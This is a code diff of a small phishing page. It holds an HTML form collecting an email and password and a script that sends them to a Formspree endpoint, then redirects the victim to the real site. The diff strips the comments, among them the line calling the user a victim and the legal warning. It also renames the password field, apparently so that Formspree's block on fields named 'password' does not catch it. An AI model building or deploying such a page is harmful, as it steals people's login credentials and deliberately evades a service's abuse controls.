@@ -1,15 +1,15 @@
-// basic HTML form asks for an email and password
-<form id="phishy-form" action="<your formspree url>" method="POST"> // replace with your Formspree URL
+
+<form id="phishy-form" action="<your formspree url>" method="POST">
+
   <label>Email:</label>
   <input type="email" name="email" required />
+
   <label>Password:</label>
-  <input type="text" name="yoozerkee" required /> // Formspree will block accounts that use name="password"
+  <input type="text" name="userkey" required />
+
   <button id="my-form-button">Submit</button>
-  <p id="my-form-status"></p>
 </form>
 
-/* JavaScript submits the form with the info the victim provids, then redirects
-the victim to the website they think they are logging into. */
 <script>
   document
     .getElementById("phishy-form")
@@ -18,19 +18,17 @@ the victim to the website they think they are logging into. */
       let formData = new FormData(this);
 
       try {
-        let response = await fetch("<your formspree url>", { // replace with your Formspree URL
+        let response = await fetch("<your formspree url>", {
           method: "POST",
           body: formData,
           headers: { Accept: "application/json" },
         });
 
         if (response.ok) {
-          window.location.href = "https://www.example.com/"; // redirects to this site after form submission
+          window.location.href = "https://www.example.com/";
         }
       } catch (error) {
         console.error("Error: ", error);
       }
     });
 </script>
-
-// THE USE OF THIS TECHNIQUE FOR MALICIOUS PURPOSES IS ILLEGAL.
